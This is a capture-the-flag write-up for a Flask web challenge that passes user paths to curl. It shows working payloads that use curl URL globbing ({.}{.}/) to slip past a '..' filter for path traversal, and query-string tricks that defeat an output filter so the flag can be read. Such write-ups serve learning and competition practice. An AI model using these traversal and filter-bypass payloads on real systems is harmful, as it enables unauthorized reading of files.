I solved some web challenges with my idol ginoah. The challenges are awesome!


The goal is to LFI /flag.txt

This flask app use curl to get a local file

```code
        proc = subprocess.run(
            ["curl", f"file://{os.getcwd()}/public/{filename}"],
            capture_output=True,
            timeout=1,
        )
```

where filename is a path parameter

```code
@app.route("/")
@app.route("/<path:filename>")
def index(filename: str = "index.html"):
```

Apparently, we need to traverse like ../../../../flag.txt

There are two WAFs. The first one filter filename with % or ..

```code
    if ".." in filename or "%" in filename:
        return "Do not try path traversal :("
```

Here, we use [URL globbing](https://everything.curl.dev/cmdline/globbing) to bypass the first WAF. {.}{.}/ equals to ../ , so

we can access flag.txt with {.}{.}/{.}{.}/flag.txt

The second WAF filter any response with content SECCON

```code
@app.after_request
def waf(response: Response):
    if b"SECCON" in b"".join(response.response):
        return Response(b"Try harder")
    return response
```

I found a logic flaw in validate func used by custom template func. We can substitue any string for { , though the function is intented to allow only keys like {...}

```code
    for i, c in enumerate(key):
        if i == 0:
            is_valid &= c == "{"
        elif i == len(key) - 1:
            is_valid &= c == "}"
        else:
            is_valid &= c != "{" and c != "}"
```

But there's still a problem. We can only replace one { now, and it is not enough to enclose SECCON in curly brackets.

ginoah found that we can use {.,.} to make the filename we curl reflected in the output. e.g.

```code
$ curl 'file:///app/public/{.}{.}/{.}{.}/flag.tx{\{,t}'
--_curl_--file:///app/public/../../flag.tx{
--_curl_--file:///app/public/../../flag.txt
SECCON{dummydummy}
```

Now we have two { , we can replace the output twice to eliminate string SECCON by GET /{.}{.}/{.}{.}/flag.tx{\{,t}?{=}{&{%0a--curl--file:///app/public/../../flag.txt%0aSECCON}=FLAG

The original solution by ginoah is trickier and shorter than it. We can use query string in file:// protocol, though it takes no effect.  The query string is revealed in the output e.g.

```code
$ curl 'file:///app/public/{.}{.}/{.}{.,.}/flag.txt?\{'
--_curl_--file:///app/public/../../flag.txt?{
SECCON{dummydummy}
--_curl_--file:///app/public/../../flag.txt?{
SECCON{dummydummy}
```

Then, we can get the flag by

```GET /{.}{.}/{.}{.}/{.}{.,.}/flag.txt%3f\{?{=}{&{%0aSECCON}=x```
